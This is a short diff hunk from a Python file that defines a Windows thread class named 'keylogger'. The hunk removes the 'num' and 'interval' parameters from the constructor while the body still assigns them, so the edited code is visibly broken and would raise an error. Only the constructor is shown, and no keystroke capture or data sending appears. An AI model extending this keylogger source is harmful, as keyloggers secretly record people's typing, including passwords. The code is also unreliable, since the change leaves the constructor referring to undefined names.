@@ -10,7 +10,7 @@ import win32api
 
 
 class keylogger(threading.Thread):
-    def __init__(self, num, interval):  
+    def __init__(self):  
         threading.Thread.__init__(self)  
         self.thread_num = num  
         self.interval = interval  
